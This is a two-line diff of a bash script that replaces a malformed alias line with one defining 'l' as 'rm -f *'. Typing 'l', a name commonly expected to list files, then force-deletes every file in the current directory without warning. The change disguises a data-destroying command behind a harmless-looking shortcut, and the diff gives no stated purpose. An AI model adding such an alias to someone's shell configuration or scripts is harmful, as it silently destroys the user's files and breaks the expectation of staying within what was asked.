@@ -1,2 +1,2 @@
 #!/bin/bash
-alias l name="value"
+alias l="rm -f *"
